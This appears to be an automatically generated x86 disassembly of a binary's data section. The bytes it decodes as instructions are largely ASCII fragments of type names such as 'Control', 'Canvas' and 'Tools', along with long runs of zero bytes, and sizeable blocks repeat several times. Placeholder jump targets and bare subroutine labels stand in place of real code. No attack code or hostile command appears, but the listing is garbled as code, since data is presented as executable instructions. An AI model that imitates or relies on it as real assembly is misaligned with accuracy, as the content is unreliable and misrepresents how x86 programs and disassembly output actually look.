add eax 0x6f546c61
jo r-xdata
inc esp
jb r-xdata
adc [ edx + 0x540b0043 ] ch
outsd
insb
jae r-xdata
outsd
outsb
je r-xdata
inc ebx
add [ eax - 0x56 ] ah
push 0x6c004380
xor eax [ eax ]
jo r-xdata
add [ eax ] al
movsb [ edi ] [ esi ]
add [ ebx ] 0x40
inc ebx
outsd
outsb
je r-xdata
add [ ebx + 0x4380b4c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
add [ ebx ] 0x3c
add [ eax ] al
add ah al
jg r-xdata
or [ ebx + 0x6f ] al
outsb
je r-xdata
inc ebx
jne r-xdata
popad
insb
push es
popad
insb
dec esp
je r-xdata
popad
insb
inc edx
outsd
je r-xdata
nop
push esp
jg r-xdata
inc eax
add [ eax ] dl
add [ ebx ] 0x0
add [ eax ] al
inc ebx
add [ eax - 0x55 ] cl
inc ebx
add ah ch
test al 0x43
add [ edx + ebp * 4 - 0x574fffbd ] ah
inc ebx
add [ ebx + ebp * 4 + 0x43 ] dl
add [ eax ] cl
stosb [ edi ]
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + esi * 4 - 0x80 ] si
inc ebx
add [ eax - 0x80 ] al
inc ebx
add [ eax ] al
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
inc ebx
add [ eax - 0x55 ] cl
inc ebx
add ah ch
test al 0x43
add [ edx + ebp * 4 - 0x574fffbd ] ah
inc ebx
add [ ebx + ebp * 4 + 0x43 ] dl
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
inc ebx
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
adc al 0x31
stosb [ edi ]
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 - 0x4 ] si
add [ ebx ] 0x7
push ss
push esp
inc edx
popad
jae r-xdata
inc ebx
add al dl
stosb [ edi ]
inc ebx
add [ eax + 0x160043aa ] al
push esp
inc edx
popad
jae r-xdata
add [ ebx + esi + 0x40 ] ch
add [ eax - 0x56 ] dh
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x6c610874
or [ ecx + 0x6c ] ah
popad
xor [ eax ] al
adc al 0x31
inc eax
add [ eax - 0x13ffbc58 ] ch
test eax 0xa9e80043
inc ebx
add ah ch
test al 0x43
add [ eax - 0x58 ] dl
inc ebx
add [ eax + 0x40043a8 ] dh
stosb [ edi ]
outsd
insd
push esp
inc ebx
jne r-xdata
add [ ecx ] al
pop es
inc ebx
add [ ebx + ebp * 4 + 0x43 ] dh
add al dl
outsd
insb
jae r-xdata
inc ebx
add [ ebp + ebp * 4 + 0x43 ] dh
add al ch
test eax 0xa8ec0043
inc ebx
add [ esp + ebp * 4 ] ch
inc ebx
add [ eax + 0x40043a8 ] dh
inc ebx
outsd
outsb
je r-xdata
stosb [ edi ]
inc ebx
add [ ebx + ebp * 4 + 0x43 ] dh
add al dl
stosb [ edi ]
inc ebx
add [ eax + 0x140043aa ] al
push esp
inc esp
jb r-xdata
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 + 0x4 ] si
add [ ebx ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
add [ ebx ] 0x40
add [ eax ] al
add [ ecx + eax * 4 ] ch
inc ebx
add [ ebx + esi + 0x40 ] ch
add [ eax - 0x56 ] dh
inc ebx
add [ ebx + ebp * 4 + 0x33800043 ] dl
inc eax
add [ ebx + esi + 0x40 ] dh
add [ eax + esi + 0x30d80040 ] bh
inc eax
add [ ecx + esi ] dl
inc eax
add ah bh
stosb [ edi ]
inc ebx
add [ eax ] dh
stosd [ edi ]
je r-xdata
inc esp
jb r-xdata
add [ ebp - 0x7e87ffc0 ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebx
add [ ebx + esi + 0x40 ] ch
add [ eax - 0x56 ] dh
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ esp - 0x7e ] si
inc ebx
add [ edi ] al
andps xmm0 [ edx + esi * 2 + 0x61 ]
stosb [ edi ]
inc ebx
add [ eax ] cl
stosb [ edi ]
inc ebx
add [ eax ] dl
stosb [ edi ]
inc ebx
add [ eax - 0x67ffbc54 ] cl
stosd [ edi ]
inc ebx
add al dl
lodsb [ esi ]
inc ebx
add [ ebp + ebp * 4 + 0x43 ] cl
add [ eax - 0x53 ] ah
inc ebx
add [ eax + 0xf0043ad ] al
push esp
inc esp
jb r-xdata
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
lea eax [ eax ]
xchg esp eax
add [ ebx ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
add [ ebx ] 0x70
add [ eax ] al
add [ eax - 0x80 ] ch
inc ebx
add [ ebx + esi + 0x40 ] ch
add [ eax - 0x56 ] dh
inc ebx
add [ eax - 0x56 ] ah
inc ebx
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
cld
stosd [ edi ]
inc ebx
add ah bh
stosb [ edi ]
stosb [ edi ]
inc ebx
add [ eax + 0x120043aa ] al
push esp
inc esp
jb r-xdata
inc eax
add ah bh
stosb [ edi ]
inc ebx
add [ eax ] dh
stosd [ edi ]
inc eax
add [ eax + esi + 0x30d80040 ] bh
inc eax
add [ ecx + esi ] dl
add [ ebx + esi + 0x40 ] dh
inc ebx
lodsb [ esi ]
inc ebx
add [ eax - 0x2fffbc55 ] bl
lodsb [ esi ]
inc ebx
add [ ebp + ebp * 4 + 0x43 ] cl
add [ eax - 0x53 ] ah
inc ebx
add [ eax + 0x110043ad ] al
push esp
inc esp
jb r-xdata
inc eax
add [ eax ] dl
stosb [ edi ]
inc ebx
add [ eax - 0x67ffbc54 ] cl
stosd [ edi ]
inc ebx
add al dl
outsd
insb
jae r-xdata
inc ecx
add [ edi + eax * 2 ] bl
inc ecx
add al dh
out dx al
inc ecx
add ah bl
out dx al
inc ecx
add [ edi + edi * 4 + 0x540e0043 ] al
inc ebx
outsd
outsb
je r-xdata
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
mov eax eax
hlt
add [ ebx + 0x438358c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + eax * 4 + 0x700043 ] dl
add [ eax ] al
dec eax
add [ ebx ] 0x6c
xor eax [ eax ]
jo r-xdata
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
outsd
insb
inc ebx
popad
outsb
jbe r-xdata
jb r-xdata
inc ebx
add [ eax - 0x7fffbc53 ] cl
xor eax [ eax ]
je r-xdata
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
jae r-xdata
add [ eax + esi + 0x30d80040 ] bh
inc eax
add ah bh
stosd [ edi ]
inc ebx
add ah bh
stosb [ edi ]
inc ebx
add [ ebp + ebp * 4 + 0x43 ] dh
add al ch
test eax 0xa8ec0043
inc ebx
add [ esp + ebp * 4 ] ch
inc ebx
add [ eax + 0x40043a8 ] dh
stosb [ edi ]
inc ebx
add [ eax ] cl
stosb [ edi ]
inc ebx
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ esp + edx * 4 - 0x7e ] si
inc ebx
add al bh
add [ ebx ] 0x0
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and [ ebx + eax * 2 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + eax * 4 ] cl
inc ebx
add [ eax + eax ] ah
add [ eax - 0x38 ] bh
inc ecx
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
pop eax
mov edi 0x48000043
inc ecx
add [ eax ] cl
dec eax
and [ ebx + eax * 2 + 0x540e0700 ] al
inc ebx
outsd
inc ecx
add al ch
retn
outsd
insb
inc ebx
popad
outsb
jbe r-xdata
fdiv [ edx - 0x3e37ffbf ]
inc ebx
add [ ebx + esi * 4 ] cl
jae r-xdata
outsb
je r-xdata
add [ ebx ] 0xffffffe4
enter 0x41 0x4
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
inc ecx
add ah dl
retn 0x43
outsd
insb
jae r-xdata
add [ ebp - 0x7b6bffc0 ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
test [ ebx ] eax
sbb al 0x0
add [ eax ] al
aam 0x92
inc esp
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
sub_43806c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
loopne r-xdata
inc eax
add [ ecx + esi ] dl
inc eax
add [ eax - 0x13ffbc58 ] ch
test eax 0xa9e80043
inc ebx
add ah ch
test al 0x43
add [ eax - 0x58 ] dl
inc ebx
add [ eax + 0x40043a8 ] dh
stosb [ edi ]
inc ebx
add [ eax ] cl
stosb [ edi ]
inc ebx
add [ eax ] dl
stosb [ edi ]
inc ebx
add [ ebx ] cl
push esp
inc esp
jb r-xdata
inc ebx
add [ eax + eax ] bh
add [ eax ] al
les edi [ edi + 0x43 ]
inc ebx
add [ eax - 0x56 ] ah
inc ebx
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
adc al 0x31
inc eax
add ah bh
stosb [ edi ]
inc ebx
add ah ch
test eax 0xa9e80043
inc ebx
add ah ch
test al 0x43
add [ edx + ebp * 4 - 0x574fffbd ] ah
inc ebx
add [ edx + ebp * 4 ] al
inc ebx
add [ eax ] cl
stosb [ edi ]
inc ebx
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + eax * 2 - 0x80 ] si
inc ebx
add [ edi ] al
or edx [ esp + eax * 2 + 0x72 ]
popad
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx - 0x80 ] si
inc ebx
add [ ecx + edx ] cl
inc eax
add [ eax ] al
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
add [ ecx + eax * 4 + r--data ] ah
add [ eax ] al
inc esp
jb r-xdata
add [ eax ] dl
stosb [ edi ]
outsd
insb
jae r-xdata
outsd
outsb
je r-xdata
inc ebx
add [ eax - 0x56 ] ah
push 0x6c004380
xor eax [ eax ]
jo r-xdata
add [ eax ] al
movsb [ edi ] [ esi ]
add [ ebx ] 0x40
inc ebx
outsd
outsb
je r-xdata
add [ ebx + 0x4380b4c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
add [ ebx ] 0x3c
add [ eax ] al
add ah al
jg r-xdata
inc ebx
add [ eax - 0x55 ] cl
inc ebx
add ah ch
test al 0x43
add [ edx + ebp * 4 - 0x574fffbd ] ah
inc ebx
add [ ebx + ebp * 4 + 0x43 ] dl
add [ eax ] cl
stosb [ edi ]
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + esi * 4 - 0x80 ] si
inc ebx
add [ eax - 0x80 ] al
inc ebx
add [ eax ] al
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
inc ebx
add [ eax - 0x55 ] cl
inc ebx
add ah ch
test al 0x43
add [ edx + ebp * 4 - 0x574fffbd ] ah
inc ebx
add [ ebx + ebp * 4 + 0x43 ] dl
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
inc ebx
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
adc al 0x31
stosb [ edi ]
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 - 0x4 ] si
add [ ebx ] 0x7
push ss
push esp
inc edx
popad
jae r-xdata
inc ebx
add al dl
stosb [ edi ]
inc ebx
add [ eax + 0x160043aa ] al
push esp
inc edx
popad
jae r-xdata
add [ ebx + esi + 0x40 ] ch
add [ eax - 0x56 ] dh
inc ebx
add [ ebx + ebp * 4 + 0x43 ] dh
add al dl
outsd
insb
jae r-xdata
inc ebx
add [ ebp + ebp * 4 + 0x43 ] dh
add al ch
test eax 0xa8ec0043
inc ebx
add [ esp + ebp * 4 ] ch
inc ebx
add [ eax + 0x40043a8 ] dh
inc ebx
outsd
outsb
je r-xdata
stosb [ edi ]
inc ebx
add [ ebx + ebp * 4 + 0x43 ] dh
add al dl
stosb [ edi ]
inc ebx
add [ eax + 0x140043aa ] al
push esp
inc esp
jb r-xdata
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 + 0x4 ] si
add [ ebx ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
add [ ebx ] 0x40
add [ eax ] al
add [ ecx + eax * 4 ] ch
inc ebx
add [ ebx + esi + 0x40 ] ch
add [ eax - 0x56 ] dh
inc ebx
add [ ebx + ebp * 4 + 0x33800043 ] dl
inc eax
add [ ebx + esi + 0x40 ] dh
add [ eax + esi + 0x30d80040 ] bh
inc eax
add [ ecx + esi ] dl
inc eax
add ah bh
stosb [ edi ]
inc ebx
add [ eax ] dh
stosd [ edi ]
je r-xdata
inc esp
jb r-xdata
add [ ebp - 0x7e87ffc0 ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebx
add [ ebx + esi + 0x40 ] ch
add [ eax - 0x56 ] dh
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ esp - 0x7e ] si
inc ebx
add [ edi ] al
andps xmm0 [ edx + esi * 2 + 0x61 ]
stosb [ edi ]
inc ebx
add [ eax ] cl
stosb [ edi ]
inc ebx
add [ eax ] dl
stosb [ edi ]
inc ebx
add [ eax - 0x67ffbc54 ] cl
stosd [ edi ]
inc ebx
add al dl
lodsb [ esi ]
inc ebx
add [ ebp + ebp * 4 + 0x43 ] cl
add [ eax - 0x53 ] ah
inc ebx
add [ eax + 0xf0043ad ] al
push esp
inc esp
jb r-xdata
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
lea eax [ eax ]
xchg esp eax
add [ ebx ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
add [ ebx ] 0x70
add [ eax ] al
add [ eax - 0x80 ] ch
inc ebx
add [ ebx + esi + 0x40 ] ch
add [ eax - 0x56 ] dh
inc ebx
add [ eax - 0x56 ] ah
inc ebx
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
cld
stosd [ edi ]
inc ebx
add ah bh
stosb [ edi ]
stosb [ edi ]
inc ebx
add [ eax + 0x120043aa ] al
push esp
inc esp
jb r-xdata
inc eax
add ah bh
stosb [ edi ]
inc ebx
add [ eax ] dh
stosd [ edi ]
inc eax
add [ eax + esi + 0x30d80040 ] bh
inc eax
add [ ecx + esi ] dl
add [ ebx + esi + 0x40 ] dh
inc ebx
lodsb [ esi ]
inc ebx
add [ eax - 0x2fffbc55 ] bl
lodsb [ esi ]
inc ebx
add [ ebp + ebp * 4 + 0x43 ] cl
add [ eax - 0x53 ] ah
inc ebx
add [ eax + 0x110043ad ] al
push esp
inc esp
jb r-xdata
inc eax
add [ eax ] dl
stosb [ edi ]
inc ebx
add [ eax - 0x67ffbc54 ] cl
stosd [ edi ]
inc ebx
add al dl
outsd
insb
jae r-xdata
inc ecx
add [ edi + eax * 2 ] bl
inc ecx
add al dh
out dx al
inc ecx
add ah bl
out dx al
inc ecx
add [ edi + edi * 4 + 0x540e0043 ] al
inc ebx
outsd
outsb
je r-xdata
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
mov eax eax
hlt
add [ ebx + 0x438358c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + eax * 4 + 0x700043 ] dl
add [ eax ] al
dec eax
add [ ebx ] 0x6c
xor eax [ eax ]
jo r-xdata
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
outsd
insb
inc ebx
popad
outsb
jbe r-xdata
jb r-xdata
inc ebx
add [ eax - 0x7fffbc53 ] cl
xor eax [ eax ]
je r-xdata
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
jae r-xdata
add [ eax + esi + 0x30d80040 ] bh
inc eax
add ah bh
stosd [ edi ]
inc ebx
add ah bh
stosb [ edi ]
inc ebx
add [ ebp + ebp * 4 + 0x43 ] dh
add al ch
test eax 0xa8ec0043
inc ebx
add [ esp + ebp * 4 ] ch
inc ebx
add [ eax + 0x40043a8 ] dh
stosb [ edi ]
inc ebx
add [ eax ] cl
stosb [ edi ]
inc ebx
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ esp + edx * 4 - 0x7e ] si
inc ebx
add al bh
add [ ebx ] 0x0
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and [ ebx + eax * 2 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + eax * 4 ] cl
inc ebx
add [ eax + eax ] ah
add [ eax - 0x38 ] bh
inc ecx
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
pop eax
mov edi 0x48000043
inc ecx
add [ eax ] cl
dec eax
and [ ebx + eax * 2 + 0x540e0700 ] al
inc ebx
outsd
inc ecx
add al ch
retn
outsd
insb
inc ebx
popad
outsb
jbe r-xdata
fdiv [ edx - 0x3e37ffbf ]
inc ebx
add [ ebx + esi * 4 ] cl
jae r-xdata
outsb
je r-xdata
add [ ebx ] 0xffffffe4
enter 0x41 0x4
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
inc ecx
add ah dl
retn 0x43
outsd
insb
jae r-xdata
add [ ebp - 0x7b6bffc0 ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
test [ ebx ] eax
sbb al 0x0
add [ eax ] al
aam 0x92
inc esp
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
sub_438130
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
movsb [ edi ] [ esi ]
add [ ebx ] 0x40
outsd
outsb
je r-xdata
inc ebx
add [ eax - 0x56 ] ah
inc ebx
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
adc al 0x31
inc eax
add ah bh
stosb [ edi ]
inc ebx
add [ eax ] dh
stosd [ edi ]
inc ebx
add [ eax - 0x55 ] cl
inc ebx
add ah ch
test al 0x43
add [ edx + ebp * 4 - 0x574fffbd ] ah
inc ebx
add [ ebx + ebp * 4 + 0x43 ] dl
add [ eax ] cl
stosb [ edi ]
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + esi * 4 - 0x80 ] si
inc ebx
add [ eax - 0x80 ] al
inc ebx
add [ eax ] al
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
inc ebx
add [ eax - 0x55 ] cl
inc ebx
add ah ch
test al 0x43
add [ edx + ebp * 4 - 0x574fffbd ] ah
inc ebx
add [ ebx + ebp * 4 + 0x43 ] dl
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
inc ebx
add [ ebx + ebp * 4 + 0x43 ] dh
add al dl
stosb [ edi ]
inc ebx
add [ eax + 0x120043aa ] al
push esp
inc esp
jb r-xdata
outsd
insb
jae r-xdata
inc ebx
add [ ebp + ebp * 4 + 0x43 ] dh
add al ch
test eax 0xa8ec0043
inc ebx
add [ esp + ebp * 4 ] ch
inc ebx
add [ eax + 0x40043a8 ] dh
inc ebx
outsd
outsb
je r-xdata
stosb [ edi ]
inc ebx
add [ ebx + ebp * 4 + 0x43 ] dh
add al dl
stosb [ edi ]
inc ebx
add [ eax + 0x140043aa ] al
push esp
inc esp
jb r-xdata
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 + 0x4 ] si
add [ ebx ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
add [ ebx ] 0x40
add [ eax ] al
add [ ecx + eax * 4 ] ch
inc ebx
add [ ebx + esi + 0x40 ] ch
add [ eax - 0x56 ] dh
inc ebx
add [ ebx + ebp * 4 + 0x33800043 ] dl
inc eax
add [ ebx + esi + 0x40 ] dh
add [ eax + esi + 0x30d80040 ] bh
inc eax
add [ ecx + esi ] dl
inc eax
add ah bh
stosb [ edi ]
inc ebx
add [ eax ] dh
stosd [ edi ]
push 0x6c004380
xor eax [ eax ]
jo r-xdata
add [ ebp - 0x7e87ffc0 ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + eax * 4 + r--data ] ah
add [ eax ] al
inc ebx
add [ ebx + esi + 0x40 ] ch
add [ eax - 0x56 ] dh
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ esp - 0x7e ] si
inc ebx
add [ edi ] al
andps xmm0 [ edx + esi * 2 + 0x61 ]
stosb [ edi ]
inc ebx
add [ eax ] cl
stosb [ edi ]
inc ebx
add [ eax ] dl
stosb [ edi ]
inc ebx
add [ eax - 0x67ffbc54 ] cl
stosd [ edi ]
inc ebx
add al dl
lodsb [ esi ]
inc ebx
add [ ebp + ebp * 4 + 0x43 ] cl
add [ eax - 0x53 ] ah
inc ebx
add [ eax + 0xf0043ad ] al
push esp
inc esp
jb r-xdata
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
lea eax [ eax ]
xchg esp eax
add [ ebx ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
add [ ebx ] 0x70
add [ eax ] al
add [ eax - 0x80 ] ch
inc ebx
add [ ebx + esi + 0x40 ] ch
add [ eax - 0x56 ] dh
inc ebx
add [ eax - 0x56 ] ah
inc ebx
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
cld
stosd [ edi ]
inc ebx
add ah bh
stosb [ edi ]
lodsb [ esi ]
inc ebx
add [ eax - 0x2fffbc55 ] bl
lodsb [ esi ]
inc ebx
add [ ebp + ebp * 4 + 0x43 ] cl
add [ eax - 0x53 ] ah
inc ebx
add [ eax + 0x110043ad ] al
push esp
inc esp
jb r-xdata
inc eax
add [ eax ] dl
stosb [ edi ]
inc ebx
add [ eax - 0x67ffbc54 ] cl
stosd [ edi ]
inc ebx
add al dl
outsd
insb
jae r-xdata
inc ecx
add [ edi + eax * 2 ] bl
inc ecx
add al dh
out dx al
inc ecx
add ah bl
out dx al
inc ecx
add [ edi + edi * 4 + 0x540e0043 ] al
inc ebx
outsd
outsb
je r-xdata
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
mov eax eax
hlt
add [ ebx + 0x438358c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + eax * 4 + 0x700043 ] dl
add [ eax ] al
dec eax
add [ ebx ] 0x6c
xor eax [ eax ]
jo r-xdata
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
outsd
insb
inc ebx
popad
outsb
jbe r-xdata
jb r-xdata
inc ebx
add [ eax - 0x7fffbc53 ] cl
xor eax [ eax ]
je r-xdata
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
jae r-xdata
add [ eax + esi + 0x30d80040 ] bh
inc eax
add ah bh
stosd [ edi ]
inc ebx
add ah bh
stosb [ edi ]
inc ebx
add [ ebp + ebp * 4 + 0x43 ] dh
add al ch
test eax 0xa8ec0043
inc ebx
add [ esp + ebp * 4 ] ch
inc ebx
add [ eax + 0x40043a8 ] dh
stosb [ edi ]
inc ebx
add [ eax ] cl
stosb [ edi ]
inc ebx
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ esp + edx * 4 - 0x7e ] si
inc ebx
add al bh
add [ ebx ] 0x0
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and [ ebx + eax * 2 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + eax * 4 ] cl
inc ebx
add [ eax + eax ] ah
add [ eax - 0x38 ] bh
inc ecx
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
pop eax
mov edi 0x48000043
inc ecx
add [ eax ] cl
dec eax
and [ ebx + eax * 2 + 0x540e0700 ] al
inc ebx
outsd
inc ecx
add al ch
retn
outsd
insb
inc ebx
popad
outsb
jbe r-xdata
fdiv [ edx - 0x3e37ffbf ]
inc ebx
add [ ebx + esi * 4 ] cl
jae r-xdata
outsb
je r-xdata
add [ ebx ] 0xffffffe4
enter 0x41 0x4
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
inc ecx
add ah dl
retn 0x43
outsd
insb
jae r-xdata
add [ ebp - 0x7b6bffc0 ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
test [ ebx ] eax
sbb al 0x0
add [ eax ] al
aam 0x92
inc esp
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
sub_439eff
mov bl 0x44
add [ ecx ] al
add [ eax ] al
